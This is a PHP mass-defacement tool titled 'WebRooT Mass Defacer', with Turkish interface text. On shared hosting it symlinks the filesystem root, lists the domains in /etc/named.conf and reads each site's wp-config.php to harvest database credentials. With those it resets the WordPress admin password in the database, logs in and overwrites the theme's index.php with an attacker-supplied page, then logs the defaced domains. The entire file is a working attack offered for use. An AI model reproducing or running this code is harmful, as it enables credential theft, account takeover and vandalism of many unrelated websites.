<?php
ini_set("display_errors", "0");
set_time_limit(0);
@session_start();
$base_path = dirname(__FILE__).'/';


function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

function randomt() {
    $chars = "abcdefghijkmnopqrstuvwxyz023456789";
    srand((double)microtime()*1000000);
    $i = 0;
    $pass = '';
    while ($i <= 7) {
        $num = rand() % 33;
        $tmp = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
    }
    return $pass;
}

function index_changer_wp($conf, $content) {
    $output = '';
    $dol = '$';
    $username = entre2v2($conf,"define('DB_USER', '","');");
    $password = entre2v2($conf,"define('DB_PASSWORD', '","');");
    $dbname = entre2v2($conf,"define('DB_NAME', '","');");
    $prefix = entre2v2($conf,$dol."table_prefix  = '","'");
    $host = entre2v2($conf,"define('DB_HOST', '","');");

    $link=mysql_connect($host,$username,$password);
    if($link) {
        mysql_select_db($dbname,$link) ;
        $dol = '$';
        $req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '0a56f86a4ea789f555c2bdfafb61fd4a' WHERE `ID` = 1");
    } else {
        $output.= "[-] DB Error<br />";
    }
    if($req1) {

        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
        $data = mysql_fetch_array($req);
        $site_url=$data["option_value"]; 

        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");
        $data = mysql_fetch_array($req);
        $template = $data["option_value"];

        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");
        $data = mysql_fetch_array($req);
        $current_theme = $data["option_value"];

        $useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";
        $url2=$site_url."/wp-login.php";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url2);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=slymn123&rememberme=forever&wp-submit=Log In&testcookie=1");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
        $buffer = curl_exec($ch);

        $pos = strpos($buffer,"action=logout");
        if($pos === false) {
            $output.= "[-] Giris Basarisiz<br />";
        } else {
            $output.= "[+] Giris Basarili<br />";
        }

        $url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';
        curl_setopt($ch, CURLOPT_URL, $url2);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
        $buffer0 = curl_exec($ch);

        $_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');
        $_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');

        if(substr_count($_file,"/index.php") != 0){
            $output.= "[+] index.php Acildi<br />";
        } else {
            $output.= "[-] index.php Acilamadi<br />";
        }

        $url2=$site_url."/wp-admin/theme-editor.php";
        curl_setopt($ch, CURLOPT_URL, $url2);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".$content."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
        $buffer = curl_exec($ch);
        curl_close($ch);

        $pos = strpos($buffer,'<div id="message" class="updated">');
        $cond = 0;
        if($pos === false) {
            $output.= "[-] index.php Guncellenemedi<br />";
        } else {
            $output.= "[+] index.php Guncellendi<br />";
            $cond = 1;
        }
    } else {
        $output.= "[-] DB Error<br />";
    }
    global $base_path;
    unlink($base_path.'COOKIE.txt');
    return array('cond'=>$cond, 'output'=>$output);
}

function exec_mode_1($def_url) {

    @mkdir('sym',0777);
    $wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $fp = @fopen ('sym/.htaccess','w');
    fwrite($fp, $wr);
    @symlink('/','sym/root');
    $dominios = @file_get_contents("/etc/named.conf");
    @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
    $out[1] = array_unique($out[1]);
    $numero_dominios = count($out[1]);
    echo "Toplam Site: $numero_dominios <br><br />";
    $def = file_get_contents($def_url);
    $def = urlencode($def);
    $base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';
    $output = fopen('defaced.html', 'a+');
    $_SESSION['count1'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count1']) ? $_SESSION['count1'] :0 ) : 0;
    $_SESSION['count2'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count2']) ? $_SESSION['count2'] :0 ) : 0;
    echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Script</th><th>0slem</th><th>Sonuc</th></tr>';
    $j = 1;
    $st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;
    for($i = $st; $i <= $numero_dominios; $i++)
    {
        $domain = $out[1][$i];
        $dono_arquivo = @fileowner("/etc/valiases/".$domain);
        $infos = @posix_getpwuid($dono_arquivo);
        
        $config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");

        $cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';

        if($config02 && preg_match('/DB_NAME/i',$config02)){
            echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
            echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
            $res = index_changer_wp($config02, $def);
            echo '<td>'.$res['output'].'</td>';
            if($res['cond']) {
                echo '<td align="center"><span class="green">HACKED</span></td>';
                fwrite($output, 'http://'.$domain."<br>");
                $_SESSION['count2'] = $_SESSION['count2'] + 1;
            } else {
                echo '<td align="center"><span class="red">BASARISIZ</span></td>';
            }
            echo '</tr>';
        }
    }
    echo '</table>';
    echo '<hr/>';
    echo 'Toplam Deface = '.($_SESSION['count1']+$_SESSION['count2']).'<br />';
    echo '<a href="defaced.html" target="_blank">Deface Edilen Siteleri Gor</a><br />';
}

echo '<!DOCTYPE html>
<html>
<head>
    <title>WebRooT Mass Defacer</title>
    <style type="text/css">
        body {color: white; background-color:#000;font-family: "Trebuchet MS",Arial;background-attachment:fixed;margin:0;padding:0;}
        .header {position:fixed;width:100%;top:0;background:#000;}
        .footer {position:fixed;width:100%;bottom:0;background:#000;}
        input[type="submit"]{background-color:rgba(25,25,25,0.6);font-size: 45px;font-weight:bold;color: red;font-family: Tahoma; border: 1px solid #666666;height:100px;width:250px;}
        input[type="submit"]:hover{color:SeaShell;}
        input[type="radio"]{margin-top: 0;}
        .even {background-color: rgba(25, 25, 25, 0.6);}
        .odd {background-color: rgba(102, 102, 102, 0.6);}
        a {color:#fff;} a:hover {color:#00BFFF;}
        fieldset{border: 1px solid grey; background: rgba(0,0,0,0.7); width: 600px; margin: 0 auto;min-height:240px;}
        textarea{background: rgba(0,0,0,0.6); color: white;}
        .green {color:#00FF00;font-weight:bold;}
        .red {color:#FF0000;font-weight:bold;}
        .killme {position: fixed; top: 20px; right: 20px; border: 2px solid yellow; padding: 10px; font-size: 20px; color: red; font-weight: bold;}
    </style>
    <script type="text/javascript">
        function change() {
            if(document.getElementById(\'rcd\').checked == true) {
                document.getElementById(\'tra\').style.display = \'\';
            } else {
                document.getElementById(\'tra\').style.display = \'none\';
            }
        }
        function hide() {
            document.getElementById(\'tra\').style.display = \'none\';
        }
    </script>
</head>
<body>
<div class="footer">
    <h3 style="text-align: center;">Coded By WebRooT</h3>
</div>
<div style="background: rgba(0,0,0,0.5);padding:90px 0 65px 0;">
    <h2 style="color:#0066FF;text-align: center;">Wordpress Mass Defacer</h2>';
    if(!isset($_POST['form_action'])){
    echo '<div align="center">
        <form action="" method="post">
            <input type="hidden" name="form_action" value="1"><br>index url:
			<input type="text" name="indexadresi" value="http://site.com/index.html" /><br>
            <input class=submit type="submit" value="!! START !!" name="Submit">
        </form>
    </div>';
    } 
    echo '<div align="center">';
    if($_POST['form_action'] == 1) {
            exec_mode_1($_POST['indexadresi']);
    }
    echo '</div>
    </div>
</body>
</html>';
?>